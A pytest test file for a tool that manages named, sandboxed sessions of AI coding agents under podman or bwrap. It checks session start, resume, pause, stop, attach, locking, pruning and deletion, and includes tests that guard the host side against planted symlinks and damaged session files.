"""Happy/sad/edge contracts for named sessions; only process boundaries are mocked."""
import contextlib
import importlib.util
import json
import os
from pathlib import Path
import re
import shutil
import signal
import subprocess
import unittest.mock
from unittest.mock import Mock

import pytest

ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location("sandbox_sessions_test", ROOT / "sandbox/sessions.py")
m = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(m)


@pytest.fixture(params=["happy", "sad", "edge"])
def scenario(request):
    return request.param


@pytest.fixture(autouse=True)
def isolated(tmp_path, monkeypatch):
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "state"))
    monkeypatch.setattr(m, "PROC", tmp_path / "proc")
    (tmp_path / "proc").mkdir()
    monkeypatch.setattr(m.sys.stdin, "isatty", lambda: False)
    # A terminal that comes back from a session waits for nothing in these tests.
    monkeypatch.setattr(m, "DETACH_GRACE", 0)
    monkeypatch.setattr(m, "ENDING_WAIT", 0)


def fake_process(tmp_path, pid, ppid, cmdline=b"python3\0", comm="python3", start=None):
    entry = tmp_path / "proc" / str(pid)
    entry.mkdir()
    (entry / "cmdline").write_bytes(cmdline)
    # The start time is field 22; without one the stat line ends early, as in the older fixtures.
    tail = " 0" * 13 + f" {start}" if start is not None else ""
    (entry / "stat").write_text(f"{pid} ({comm}) S {ppid} 1 1 0 -1{tail}\n")


def make_session(name, backend="podman", pid=None, tmp_path=None, paused=False):
    directory = m.session_dir(name)
    for path in (directory, directory / "home", directory / "tmux"):
        path.mkdir(parents=True, exist_ok=True)
    data = {"agent": "codex", "options": ["--workspace", "/srv/w", "--backend", backend], "agent_args": [],
            "backend": backend, "workspace": "/srv/w", "cwd": "/", "created": "2026-10-31T00:00:00Z",
            "pod": f"agent-session-{name}"}
    if pid:
        data["pid"] = pid
        fake_process(tmp_path, pid, 1, b"python3\0agent_sandbox.py\0--tmux-socket-dir\0"
                     + os.fsencode(str(directory / "tmux")) + b"\0")
    if paused:
        (directory / "paused").touch()
    m.save(name, data)
    return data


def test_split_argv(scenario):
    argv = {"happy": ["codex", "--workspace", "/w", "--session", "s1", "--", "exec", "task"],
            "sad": ["codex", "--session", "s1"],
            "edge": ["codex", "--session=s1", "--gui", "--", "--session", "literal"]}[scenario]
    expected = {"happy": (["--workspace", "/w"], ["exec", "task"]), "sad": ([], []),
                "edge": (["--gui"], ["--session", "literal"])}[scenario]
    assert m.split_argv(argv) == expected


def test_start_new_session_launches_detached_supervisor(tmp_path, monkeypatch):
    launched = {}
    def popen(cmd, **kwargs):
        launched.update(cmd=cmd, **kwargs)
        (m.session_dir("demo") / "tmux" / "attach.sock").touch()
        fake_process(tmp_path, 4242, 1, start=987654)
        return Mock(pid=4242, poll=Mock(return_value=None))
    monkeypatch.setattr(m.subprocess, "Popen", popen)
    monkeypatch.setattr(m, "clear_stale_pod", Mock())
    monkeypatch.chdir(tmp_path)
    a = m.launcher().parse_args(["codex", "--workspace", "/srv/w", "--session", "demo"])
    assert m.start(a, ["codex", "--workspace", "/srv/w", "--session", "demo", "--", "exec", "x"]) == 0
    directory = m.session_dir("demo")
    cmd = launched["cmd"]
    assert cmd[cmd.index("--state-dir") + 1] == str(directory / "home")
    assert cmd[cmd.index("--tmux-socket-dir") + 1] == str(directory / "tmux")
    # Every run of a session has a run id (and pod) of its own; session.json says which is current.
    pod = cmd[cmd.index("--pod-name") + 1]
    assert re.fullmatch(r"agent-codex-[0-9a-f]{8}", pod) and m.load("demo")["run"] == pod[len("agent-"):]
    assert cmd[cmd.index("--") + 1:] == ["exec", "x"]
    assert "--session" not in cmd
    assert launched["start_new_session"] is True and launched["cwd"] == str(tmp_path)
    assert launched["stdin"] == subprocess.DEVNULL
    data = m.load("demo")
    assert data["pid"] == 4242 and data["pid_start"] == 987654 and data["agent_args"] == ["exec", "x"]
    for path in (directory, directory / "home", directory / "tmux"):
        assert path.stat().st_mode & 0o777 == 0o700


def test_start_refuses_running_and_resumes_stopped(scenario, tmp_path, monkeypatch):
    if scenario == "sad":
        make_session("busy", pid=77, tmp_path=tmp_path)
        a = m.launcher().parse_args(["codex", "--session", "busy"])
        with pytest.raises(ValueError, match="attach with: sandbox-ai attach busy"):
            m.start(a, ["codex", "--session", "busy"])
    elif scenario == "edge":
        make_session("other")
        a = m.launcher().parse_args(["claude", "--session", "other"])
        with pytest.raises(ValueError, match="belongs to codex"):
            m.start(a, ["claude", "--session", "other"])
    else:
        make_session("old")
        launch = Mock(return_value=0)
        monkeypatch.setattr(m, "launch", launch)
        a = m.launcher().parse_args(["codex", "--session", "old", "--gui"])
        assert m.start(a, ["codex", "--session", "old", "--gui"]) == 0
        name, data, agent_args, merged = launch.call_args.args
        assert agent_args == ["resume", "--last"] and merged is a
        assert data["options"] == ["--workspace", "/srv/w", "--backend", "podman"]


def test_start_warns_when_options_of_a_stopped_session_are_ignored(scenario, monkeypatch, capsys):
    make_session("old")
    monkeypatch.setattr(m, "launch", Mock(return_value=0))
    argv = {"happy": ["codex", "--workspace", "/srv/w", "--backend", "podman", "--session", "old"],
            "sad": ["codex", "--session", "old", "--allow-github"],
            "edge": ["codex", "--workspace", "/srv/w", "--backend", "podman", "--session", "old", "--", "exec", "x"]}[scenario]
    assert m.start(m.launcher().parse_args(argv), argv) == 0
    err = capsys.readouterr().err
    if scenario == "happy":
        # The same options as saved, or none at all: nothing is lost, so no warning.
        assert "warning" not in err
        assert m.start(m.launcher().parse_args(["codex", "--session", "old"]), ["codex", "--session", "old"]) == 0
        assert "warning" not in capsys.readouterr().err
    else:
        ignored = "--allow-github" if scenario == "sad" else "-- exec x"
        assert "warning" in err and f"ignored now: {ignored}" in err
        assert "--workspace /srv/w --backend podman" in err
    assert m.launch.call_args.args[2] == ["resume", "--last"]


def test_clear_stale_pod(scenario, tmp_path, monkeypatch, capsys):
    data = make_session("s", backend="bwrap" if scenario == "edge" else "podman")
    own = str((m.session_dir("s") / "tmux").resolve())
    labels = {"happy": {m.launcher().SESSION_LABEL: own}, "sad": {m.launcher().SESSION_LABEL: "/elsewhere/tmux"},
              "edge": {}}[scenario]
    calls = []

    def run(cmd, **kwargs):
        calls.append(cmd)
        if cmd[1:3] == ["pod", "inspect"]:
            return Mock(returncode=0, stdout=json.dumps(labels) + "\n")
        return Mock(returncode=0)
    monkeypatch.setattr(m.subprocess, "run", run)
    if scenario == "happy":
        m.clear_stale_pod("s", data)
        assert calls[-1] == ["podman", "pod", "rm", "--force", "agent-session-s"]
        assert "left behind" in capsys.readouterr().err
    elif scenario == "sad":
        # A pod of the same name from another state directory may be in use: never removed.
        with pytest.raises(ValueError, match="podman pod rm --force agent-session-s"):
            m.clear_stale_pod("s", data)
        assert all(cmd[1:3] != ["pod", "rm"] for cmd in calls)
    else:
        m.clear_stale_pod("s", data)
        assert calls == []  # bwrap has no pod


def test_clear_stale_pod_without_pod_or_podman(scenario, monkeypatch):
    data = make_session("s")
    if scenario == "happy":
        monkeypatch.setattr(m.subprocess, "run", Mock(return_value=Mock(returncode=125, stdout="")))
    elif scenario == "sad":
        monkeypatch.setattr(m.subprocess, "run", Mock(side_effect=FileNotFoundError("podman")))
    else:
        # A pod without labels (created before labelling) is not removed automatically.
        monkeypatch.setattr(m.subprocess, "run", Mock(return_value=Mock(returncode=0, stdout="null\n")))
        with pytest.raises(ValueError, match="not created here"):
            m.clear_stale_pod("s", data)
        return
    m.clear_stale_pod("s", data)
    assert m.subprocess.run.call_count == 1


def test_launch_clears_stale_pod_first(tmp_path, monkeypatch):
    data = make_session("s")
    order = []
    monkeypatch.setattr(m, "clear_stale_pod", lambda name, d: order.append("clear"))
    def popen(cmd, **kwargs):
        order.append("popen")
        (m.session_dir("s") / "tmux" / "attach.sock").touch()
        return Mock(pid=4243, poll=Mock(return_value=None))
    monkeypatch.setattr(m.subprocess, "Popen", popen)
    assert m.launch("s", data, ["resume", "--last"]) == 0
    assert order == ["clear", "popen"]


def test_wait_ready(scenario, tmp_path):
    directory = tmp_path / "s"
    (directory / "tmux" / "tmux-0").mkdir(parents=True)
    (directory / "supervisor.log").write_text("boom: image missing\n")
    if scenario == "happy":
        (directory / "tmux" / "attach.sock").touch()
        m.wait_ready(directory, Mock(poll=Mock(return_value=None)))
    elif scenario == "sad":
        with pytest.raises(RuntimeError, match="image missing"):
            m.wait_ready(directory, Mock(poll=Mock(return_value=1), returncode=1))
    else:
        with pytest.raises(RuntimeError, match="within 0"):
            m.wait_ready(directory, Mock(poll=Mock(return_value=None)), timeout=0)


def test_status(scenario, tmp_path):
    if scenario == "happy":
        assert m.status("a", make_session("a", pid=10, tmp_path=tmp_path)) == "running"
        assert m.status("b", make_session("b", pid=11, tmp_path=tmp_path, paused=True)) == "paused"
    elif scenario == "sad":
        assert m.status("c", make_session("c")) == "stopped"
        assert m.status("d", {**make_session("d"), "pid": 999}) == "stopped"
    else:
        # A reused PID that runs something else is not the session.
        fake_process(tmp_path, 12, 1, b"vim\0")
        assert m.status("e", {**make_session("e"), "pid": 12}) == "stopped"


def test_status_compares_the_start_time(scenario, tmp_path):
    data = make_session("s")
    fake_process(tmp_path, 20, 1, b"python3\0--tmux-socket-dir\0" + os.fsencode(str(m.session_dir("s") / "tmux"))
                 + b"\0", start=5000)
    if scenario == "happy":
        assert m.status("s", {**data, "pid": 20, "pid_start": 5000}) == "running"
    elif scenario == "sad":
        # Same PID and command line, other start time: a later process (another run of this launcher).
        assert m.status("s", {**data, "pid": 20, "pid_start": 4999}) == "stopped"
    else:
        # Written by an older version without a start time: the command line decides, as before.
        assert m.status("s", {**data, "pid": 20}) == "running"


def test_descendants_and_signal_tree(scenario, tmp_path, monkeypatch):
    fake_process(tmp_path, 100, 1)
    fake_process(tmp_path, 101, 100, comm="bwrap")
    fake_process(tmp_path, 102, 101, comm="odd) name (x")
    fake_process(tmp_path, 103, 102)
    fake_process(tmp_path, 200, 1)
    if scenario == "sad":
        assert m.descendants(200) == []
        return
    assert m.descendants(100) == [101, 102, 103]
    sent = []
    def kill(pid, sig):
        if pid == 103 and scenario == "edge":
            raise ProcessLookupError
        sent.append((pid, sig))
    monkeypatch.setattr(m.os, "kill", kill)
    m.signal_tree(100, signal.SIGSTOP if scenario == "happy" else signal.SIGCONT)
    if scenario == "happy":
        assert sent == [(p, signal.SIGSTOP) for p in (100, 101, 102, 103)] * 2
    else:
        assert sent == [(p, signal.SIGCONT) for p in (100, 101, 102)]


@pytest.mark.parametrize("backend", ["podman", "bwrap"])
def test_pause_and_resume(backend, tmp_path, monkeypatch):
    make_session("p", backend=backend, pid=50, tmp_path=tmp_path)
    run, tree = Mock(), Mock()
    monkeypatch.setattr(m.subprocess, "run", run)
    monkeypatch.setattr(m, "signal_tree", tree)
    assert m.pause("p") == 0
    assert m.status("p", m.load("p")) == "paused"
    with pytest.raises(ValueError, match="paused"):
        m.pause("p")
    assert m.resume("p") == 0
    assert m.status("p", m.load("p")) == "running"
    if backend == "podman":
        assert [c.args[0][-3:] for c in run.call_args_list] == [["pod", "pause", "agent-session-p"],
                                                                ["pod", "unpause", "agent-session-p"]]
        tree.assert_not_called()
    else:
        assert [c.args for c in tree.call_args_list] == [(50, signal.SIGSTOP), (50, signal.SIGCONT)]
        run.assert_not_called()


def test_resume_stopped_session_restarts_with_continue(tmp_path, monkeypatch):
    make_session("s")
    launch = Mock(return_value=0)
    monkeypatch.setattr(m, "launch", launch)
    assert m.resume("s") == 0
    assert launch.call_args.args[2] == ["resume", "--last"]


def test_restart_args(scenario):
    data = {"agent": "claude", "options": [], "agent_args": ["-p", "task"]}
    if scenario == "happy":
        assert m.restart_args(data) == ["--continue"]
    elif scenario == "sad":
        assert m.restart_args({**data, "options": ["--binary", "/usr/bin/python3"]}) == ["-p", "task"]
    else:
        assert m.restart_args({**data, "options": ["--binary=/opt/tool"]}) == ["-p", "task"]


def test_stop(scenario, tmp_path, monkeypatch):
    data = make_session("x", pid=60, tmp_path=tmp_path, paused=scenario == "edge")
    kills, run = [], Mock()
    monkeypatch.setattr(m.subprocess, "run", run)
    monkeypatch.setattr(m.time, "sleep", lambda _: None)
    # status() asks once, then the wait loop and the final check.
    states = iter([True, False, False]) if scenario != "sad" else iter([])
    monkeypatch.setattr(m, "alive", lambda name, data: next(states, True))
    monkeypatch.setattr(m, "thaw", Mock())
    def kill(pid, sig):
        kills.append(sig)
    monkeypatch.setattr(m.os, "kill", kill)
    if scenario == "sad":
        assert m.stop("x", timeout=0) == 0
        assert kills == [signal.SIGTERM, signal.SIGKILL]
        # Only the session's own, labelled pod is removed: inspect first, then rm.
        own = json.dumps({m.launcher().SESSION_LABEL: str((m.session_dir("x") / "tmux").resolve())})
        run.return_value = Mock(returncode=0, stdout=own)
        run.reset_mock()
        states = iter([True])
        kills.clear()
        assert m.stop("x", timeout=0) == 0
        assert run.call_args_list[0].args[0][1:3] == ["pod", "inspect"]
        assert run.call_args.args[0][-4:] == ["pod", "rm", "--force", "agent-session-x"]
    else:
        assert m.stop("x") == 0
        assert kills == [signal.SIGTERM]
        assert m.thaw.called == (scenario == "edge")
    assert (m.session_dir("x") / "home").is_dir()


def test_attach(scenario, tmp_path, monkeypatch):
    call = Mock(return_value=0)
    monkeypatch.setattr(m.subprocess, "call", call)
    monkeypatch.setenv("TMUX", "/tmp/outer,1,0")
    if scenario == "sad":
        make_session("z", pid=70, tmp_path=tmp_path, paused=True)
        with pytest.raises(ValueError, match="paused"):
            m.attach("z")
        return
    backend = "podman" if scenario == "happy" else "bwrap"
    make_session("z", backend=backend, pid=71, tmp_path=tmp_path)
    client = Mock(return_value=0)
    monkeypatch.setattr(m.launcher(), "attach_client", client)
    assert m.attach("z") == 0
    # Never a tmux client or podman exec on the host side: only the byte relay.
    call.assert_not_called()
    assert client.call_args.args[0] == str(m.session_dir("z") / "tmux" / "attach.sock")


def test_delete(scenario, tmp_path):
    if scenario == "sad":
        make_session("d", pid=80, tmp_path=tmp_path)
        with pytest.raises(ValueError, match="Stop session"):
            m.delete("d", yes=True)
    elif scenario == "edge":
        make_session("d")
        with pytest.raises(ValueError, match="--yes"):
            m.delete("d")
        assert m.session_dir("d").exists()
    else:
        make_session("d")
        assert m.delete("d", yes=True) == 0
        assert not m.session_dir("d").exists()


def test_session_name_validation(scenario):
    if scenario == "sad":
        # An id is a name, perhaps with a -xxxx suffix (sessions.new_key): at most 48 characters.
        for name in ("../x", "a b", "", "x" * 49, ".hidden", None):
            with pytest.raises(ValueError):
                m.session_dir(name)
    else:
        name = "demo" if scenario == "happy" else "A.b_c-1"
        assert m.session_dir(name).name == name


def test_list_and_cli(tmp_path, capsys):
    make_session("one")
    make_session("two", pid=90, tmp_path=tmp_path)
    assert m.cli(["list"]) == 0
    lines = capsys.readouterr().out.splitlines()
    assert lines[0].split() == ["NAME", "AGENT", "BACKEND", "STATUS", "CREATED", "WORKSPACE"]
    assert lines[1].split()[:4] == ["one", "codex", "podman", "stopped"]
    assert lines[2].split()[:4] == ["two", "codex", "podman", "running"]
    with pytest.raises(SystemExit):
        m.cli(["frobnicate", "x"])


def test_wrapper_script_runs_isolated(tmp_path):
    env = {**os.environ, "XDG_STATE_HOME": str(tmp_path / "empty")}
    result = subprocess.run([str(ROOT / "sandbox-ai"), "session", "list"], capture_output=True, text=True, env=env)
    assert result.returncode == 0, result.stderr
    assert result.stdout.startswith("no sessions; start one with: sandbox-ai AGENT --session NAME")
    result = subprocess.run([str(ROOT / "sandbox-ai"), "session", "attach", "missing"], capture_output=True, text=True, env=env)
    assert result.returncode == 1 and "No session named missing" in result.stderr


def trusted_project(tmp_path, document):
    project = tmp_path / "proj"
    project.mkdir()
    path = project / ".sandbox-ai.json"
    path.write_text(json.dumps({"version": 1, "agent": "codex", **document}))
    m.launcher().trust_config(path)
    return project


def test_project_agent_args_reach_sessions(scenario, tmp_path, monkeypatch):
    """Review finding: the project file's agent_args were dropped because the supervisor always got "--"."""
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "cfg"))
    project = trusted_project(tmp_path, {"agent_args": {"happy": ["--sandbox", "read-only"], "sad": ["exec", "x"],
                                                        "edge": ["--sandbox", "read-only"]}[scenario],
                                         "options": ["--backend", "bwrap"]})
    data = make_session("s", backend="podman")
    data.update(options=["--workspace", str(project)], cwd=str(project), workspace=str(project))
    if scenario == "edge":
        data["ready"] = False  # the first start never came up
    m.save("s", data)
    a, document = m.effective(data)
    # The project file's --backend is what the launcher uses, so pause/stop must use it too.
    assert a.backend == "bwrap" and document["agent_args"]
    args = m.restart_args(data, document["agent_args"])
    expected = {"happy": ["--sandbox", "read-only", "resume", "--last"], "sad": ["resume", "--last"],
                "edge": []}[scenario]
    assert args == expected
    captured = {}
    monkeypatch.setattr(m, "clear_stale_pod", Mock())
    def popen(cmd, **kwargs):
        captured["cmd"] = cmd
        (m.session_dir("s") / "tmux" / "attach.sock").touch()
        return Mock(pid=4244, poll=Mock(return_value=None))
    monkeypatch.setattr(m.subprocess, "Popen", popen)
    assert m.launch("s", data, [], a) == 0
    # No "--" without agent arguments: the launcher then applies the project file's agent_args.
    assert "--" not in captured["cmd"]
    saved = m.load("s")
    assert saved["backend"] == "bwrap" and saved["ready"] is True


def test_launch_recreates_socket_directory(scenario, tmp_path, monkeypatch):
    """Review finding: the agent could block restarts with a directory named attach.sock or a chmod of HOME."""
    data = make_session("r")
    tmux, home = m.session_dir("r") / "tmux", m.session_dir("r") / "home"
    if scenario == "happy":
        (tmux / "attach.sock").mkdir()
        (tmux / "attach.sock" / "x").write_text("")
    elif scenario == "sad":
        home.chmod(0o755)
    else:
        (tmux / "attach.sock").symlink_to(tmp_path)
    monkeypatch.setattr(m, "clear_stale_pod", Mock())
    seen = {}
    def popen(cmd, **kwargs):
        seen["entries"] = sorted(p.name for p in tmux.iterdir())
        (tmux / "attach.sock").touch()
        return Mock(pid=4245, poll=Mock(return_value=None))
    monkeypatch.setattr(m.subprocess, "Popen", popen)
    assert m.launch("r", data, ["resume", "--last"], m.SimpleNamespace(backend="podman", podman_url=None)) == 0
    assert seen["entries"] == []
    assert tmux.stat().st_mode & 0o777 == 0o700 and home.stat().st_mode & 0o777 == 0o700
    assert tmp_path.is_dir()


def test_descendants_skip_mcp_supervisors(scenario, tmp_path):
    """Review finding: pausing a bwrap session froze MCP servers that other agents use."""
    fake_process(tmp_path, 10, 1)
    fake_process(tmp_path, 11, 10)
    mcp_cmd = b"python3\0agent_sandbox.py\0codex\0--mcp-socket-dir\0/s\0"
    fake_process(tmp_path, 12, 10, mcp_cmd if scenario != "sad" else b"python3\0")
    fake_process(tmp_path, 13, 12)
    expected = {"happy": [11], "sad": [11, 12, 13], "edge": [11]}[scenario]
    assert m.descendants(10) == expected


def test_rows_survive_damaged_sessions(scenario, tmp_path):
    make_session("good")
    bad = m.root() / "bad"
    bad.mkdir()
    if scenario == "happy":
        (bad / "session.json").write_text("{not json")
    elif scenario == "sad":
        (bad / "session.json").write_text(json.dumps({"agent": "codex"}))
    rows = m.rows()
    assert rows[-1][0] == "good"
    if scenario == "edge":
        assert [r[0] for r in rows] == ["good"]
    else:
        assert rows[0] == ["bad", "?", "?", "damaged", "-", "-"]


def test_delete_removes_read_only_trees(scenario, tmp_path):
    make_session("d")
    cache = m.session_dir("d") / "home" / ("go/pkg/mod" if scenario != "edge" else "x")
    cache.mkdir(parents=True)
    (cache / "file").write_text("")
    if scenario != "sad":
        cache.chmod(0o500)
        m.session_dir("d").joinpath("home").chmod(0o500 if scenario == "edge" else 0o700)
    assert m.delete("d", yes=True) == 0
    assert not m.session_dir("d").exists()


def test_session_lock(scenario, tmp_path, monkeypatch):
    """Review finding: two concurrent resumes could both see "stopped" and launch twice."""
    import fcntl
    if scenario == "sad":
        with pytest.raises(ValueError, match="No session named"):
            with m.session_lock("ghost"):
                pass
        assert not m.session_dir("ghost").exists()
        return
    make_session("l")
    held = os.open(m.session_dir("l") / ".lock", os.O_RDWR | os.O_CREAT)
    try:
        fcntl.flock(held, fcntl.LOCK_EX)
        if scenario == "happy":
            for command in (lambda: m.resume("l"), lambda: m.stop("l"), lambda: m.pause("l"),
                            lambda: m.delete("l", yes=True)):
                with pytest.raises(ValueError, match="another command"):
                    command()
        else:
            fcntl.flock(held, fcntl.LOCK_UN)
            monkeypatch.setattr(m, "launch", Mock(return_value=0))
            monkeypatch.setattr(m, "attach", Mock(side_effect=AssertionError("attach while locked")))
            monkeypatch.setattr(m.sys.stdin, "isatty", lambda: True)
            monkeypatch.setattr(m.sys.stdout, "isatty", lambda: True)
            locked_during_attach = []
            def attach(name):
                # The lock must be free while the terminal is attached.
                probe = os.open(m.session_dir("l") / ".lock", os.O_RDWR)
                try:
                    fcntl.flock(probe, fcntl.LOCK_EX | fcntl.LOCK_NB)
                    locked_during_attach.append(False)
                finally:
                    os.close(probe)
                return 0
            monkeypatch.setattr(m, "attach", attach)
            assert m.resume("l") == 0
            assert locked_during_attach == [False]
    finally:
        os.close(held)


def test_restart_keeps_agent_options(scenario):
    data = {"agent": "claude", "options": [], "agent_args": {"happy": ["--model", "sonnet"],
                                                             "sad": ["--model", "sonnet", "-p", "task"],
                                                             "edge": []}[scenario]}
    expected = {"happy": ["--model", "sonnet", "--continue"], "sad": ["--continue"],
                "edge": ["--add-dir", "/workspaces/lib", "--continue"]}[scenario]
    assert m.restart_args(data, ["--add-dir", "/workspaces/lib"]) == expected
    # --binary from the project file repeats the arguments instead of continuing.
    assert m.restart_args({**data, "agent_args": []}, ["-I", "x.py"], binary=True) == ["-I", "x.py"]


@pytest.mark.parametrize("agent,args,expected", [
    ("claude", ["--model", "opus", "fix the failing tests"], ["--model", "opus", "--continue"]),
    ("codex", ["--model", "o3", "implement X"], ["--model", "o3", "resume", "--last"]),
    ("claude", ["--resume", "abc"], ["--continue"]),
    ("claude", ["--verbose", "do it"], ["--continue"]),
    ("codex", ["-p", "work", "--sandbox", "read-only"], ["-p", "work", "--sandbox", "read-only", "resume", "--last"]),
    ("codex", ["exec", "task"], ["resume", "--last"]),
    ("opencode", ["--model=x/y", "run", "go"], ["--continue"]),
    ("claude", ["--add-dir", "/w", "--unknown", "value"], ["--add-dir", "/w", "--continue"]),
])
def test_review_restart_never_repeats_prompts(agent, args, expected):
    """Review finding: options were kept together with the prompt that followed them."""
    assert m.restart_args({"agent": agent, "options": [], "agent_args": args}) == expected


def test_failed_first_start_leaves_no_directory(scenario, tmp_path, monkeypatch):
    def fail(a, argv, key=None):
        if scenario != "sad":
            raise ValueError("image missing")
        # Saved, then its supervisor ended before it was ready: never ran, so not kept either (a session that a
        # `--session x` or resume would start again with the options that failed).
        m.save("x", {"agent": "codex", "ready": False})
        raise RuntimeError("Session failed to start (status 1)")
    monkeypatch.setattr(m, "start_locked", fail)
    a = m.launcher().parse_args(["codex", "--session", "x"])
    if scenario == "edge":
        m.session_dir("x").mkdir(parents=True)  # existed before: never removed
    with pytest.raises((ValueError, RuntimeError)):
        m.start(a, ["codex", "--session", "x"])
    assert m.session_dir("x").exists() == (scenario == "edge")


def test_a_first_start_that_ran_or_still_runs_is_kept(tmp_path, monkeypatch):
    """Only a session that never ran goes: one that was ready once, or whose supervisor still runs (a start that
    took too long), stays."""
    for name, data, state in (("ran", {"ready": True}, "stopped"), ("slow", {"ready": False}, "running")):
        def fail(a, argv, key=None, data=data, name=name):
            m.save(name, {"agent": "codex", **data})
            raise RuntimeError("Session did not become ready")
        monkeypatch.setattr(m, "start_locked", fail)
        monkeypatch.setattr(m, "status", lambda key, data, state=state: state)
        with pytest.raises(RuntimeError):
            m.start(m.launcher().parse_args(["codex", "--session", name]), ["codex", "--session", name])
        assert m.session_dir(name).exists(), name


# --- every interactive start is a session --------------------------------------------------------------------


def test_split_argv_drops_the_naming_options(scenario):
    argv = {"happy": ["claude", "--name", "review", "--gui", "--project-name=shop"],
            "sad": ["claude", "--name=x", "--session", "y"],
            "edge": ["claude", "--gui", "--", "--name", "literal"]}[scenario]
    expected = {"happy": (["--gui"], []), "sad": ([], []), "edge": (["--gui"], ["--name", "literal"])}[scenario]
    assert m.split_argv(argv) == expected


def test_start_of_an_interactive_start(scenario, tmp_path, monkeypatch):
    """Not --session: a new session under the start's name; without a kept HOME no home/ and no --state-dir."""
    launched = {}

    def popen(cmd, **kwargs):
        launched["cmd"] = cmd
        key = cmd[cmd.index("--start-id") + 1]
        (m.session_dir(key) / "tmux" / "attach.sock").touch()
        return Mock(pid=4250, poll=Mock(return_value=None))
    monkeypatch.setattr(m.subprocess, "Popen", popen)
    monkeypatch.setattr(m, "clear_stale_pod", Mock())
    monkeypatch.chdir(tmp_path)
    argv = ["claude", "--workspace", "/srv/shop", "--name", "review"]
    a = m.launcher().parse_args(argv)
    a.start_name, a.keep_home = "review", scenario == "edge"
    if scenario == "sad":
        stopped_session("review", name="other")  # a renamed session holds the directory: another id is chosen
    assert m.start(a, argv) == 0
    key = launched["cmd"][launched["cmd"].index("--start-id") + 1]
    data = m.load(key)
    assert data["name"] == "review" and data["mode"] == "tmux" and "--name" not in data["options"]
    assert data["keep"] is (scenario == "edge")
    assert ("--state-dir" in launched["cmd"]) is (scenario == "edge")
    assert (m.session_dir(key) / "home").is_dir() is (scenario == "edge")
    if scenario == "sad":
        assert key.startswith("review-") and len(key) == len("review-") + 4
    else:
        assert key == "review"
    assert [e["event"] for e in m.starts().history("review")] == ["start"]


def stopped_session(key, **fields):
    """A stopped session KEY with FIELDS."""
    name = key
    directory = m.session_dir(name)
    for path in (directory, directory / "tmux"):
        path.mkdir(parents=True, exist_ok=True)
    data = {"agent": "codex", "options": [], "agent_args": [], "backend": "podman", "workspace": "/srv/w", "cwd": "/",
            "created": "2026-11-01T00:00:00Z", "pod": f"agent-session-{name}", **fields}
    m.save(name, data)
    return data


def test_start_refuses_a_name_taken_meanwhile(tmp_path, monkeypatch):
    a = m.launcher().parse_args(["claude"])
    a.start_name = "busy"
    stopped_session("busy")
    monkeypatch.setattr(m, "new_key", lambda name: name)  # as if the directory came after the key was chosen
    with pytest.raises(ValueError, match="was taken meanwhile"):
        m.start(a, ["claude"])


def test_keeps_home(scenario):
    if scenario == "happy":
        assert m.keeps_home({"keep": True})
    elif scenario == "sad":
        assert not m.keeps_home({"keep": False})
    else:
        assert m.keeps_home({})  # sessions of older versions always kept their HOME


def test_relay_listening(scenario, tmp_path):
    import socket
    path = tmp_path / "attach.sock"
    if scenario == "happy":
        server = socket.socket(socket.AF_UNIX)
        server.bind(str(path))
        server.listen(1)
        try:
            assert m.relay_listening(path) is True
        finally:
            server.close()
        assert m.relay_listening(path) is False  # the socket file stays, nobody listens
    elif scenario == "sad":
        assert m.relay_listening(path) is False
        path.write_text("")
        assert m.relay_listening(path) is False  # not a socket
    else:
        server = socket.socket(socket.AF_UNIX)
        server.bind(str(tmp_path / "real.sock"))
        server.listen(1)
        path.symlink_to(tmp_path / "real.sock")  # planted by the sandbox: never followed
        try:
            assert m.relay_listening(path) is False
        finally:
            server.close()


def test_exit_status(scenario):
    data = stopped_session("e", run="claude-1")
    path = m.session_dir("e") / "exit.json"
    if scenario == "happy":
        path.write_text(json.dumps({"run": "claude-1", "status": 3}))
        assert m.exit_status("e", data) == 3
    elif scenario == "sad":
        assert m.exit_status("e", data) is None
        path.write_text(json.dumps({"run": "claude-0", "status": 3}))  # an earlier run's
        assert m.exit_status("e", data) is None
    else:
        path.write_text(json.dumps({"run": "claude-1", "status": True}))
        assert m.exit_status("e", data) is None


def test_prune(scenario, tmp_path):
    if scenario == "happy":
        stopped_session("gone", keep=False)
        assert m.prune("gone") is True and not m.session_dir("gone").exists()
        assert m.prune("gone") is False
    elif scenario == "sad":
        stopped_session("kept", keep=True)
        assert m.prune("kept") is False and m.session_dir("kept").exists()
    else:
        directory = m.session_dir("live")
        (directory / "tmux").mkdir(parents=True)
        fake_process(tmp_path, 300, 1, b"python3\0--tmux-socket-dir\0" + os.fsencode(str(directory / "tmux")) + b"\0")
        m.save("live", {"agent": "codex", "options": [], "keep": False, "pid": 300})
        assert m.prune("live") is False  # still running


def test_prune_locks_only_what_it_may_remove(tmp_path, monkeypatch):
    """Bug hunt: prune took the lock of every session it looked at (sandbox-ai list, the app's refresh, every
    command's lookup by name): a start, stop or pause of a session at that moment failed as "being started or
    stopped by another command". A session that keeps its HOME, or runs, is never removed: not locked either."""
    stopped_session("kept", keep=True)
    directory = m.session_dir("live")
    (directory / "tmux").mkdir(parents=True)
    fake_process(tmp_path, 300, 1, b"python3\0--tmux-socket-dir\0" + os.fsencode(str(directory / "tmux")) + b"\0")
    m.save("live", {"agent": "codex", "options": [], "keep": False, "pid": 300})
    locked = []
    monkeypatch.setattr(m, "session_lock", lambda name, create=False: locked.append(name) or contextlib.nullcontext())
    assert m.prune("kept") is False and m.prune("live") is False
    assert locked == []
    stopped_session("gone", keep=False)
    assert m.prune("gone") is True and locked == ["gone"]


def test_a_session_json_that_is_no_object_is_damaged_not_a_crash(tmp_path):
    """Bug hunt: a session.json holding a list (valid JSON, no object) made prune fail with AttributeError, so
    sandbox-ai list (and the app) ended in a traceback instead of showing that one start as damaged."""
    make_session("good")
    (m.root() / "bad").mkdir()
    (m.root() / "bad" / "session.json").write_text("[]")
    assert m.prune("bad") is False
    assert [row for row in m.rows() if row[0] == "bad"][0][3] == "damaged"
    assert m.starts().start_entries()["bad"]["state"] == "damaged"


def test_after_attach(scenario, tmp_path, monkeypatch, capsys):
    data = stopped_session("t", keep=False, run="claude-1", pid=310)
    if scenario == "happy":
        # Ctrl-b d: the sandbox runs on, its relay listens.
        monkeypatch.setattr(m, "alive", lambda name, d: True)
        monkeypatch.setattr(m, "relay_listening", lambda path: True)
        assert m.after_attach("t") == 0
        assert "detached from t; it keeps running. Back: sandbox-ai attach t" in capsys.readouterr().err
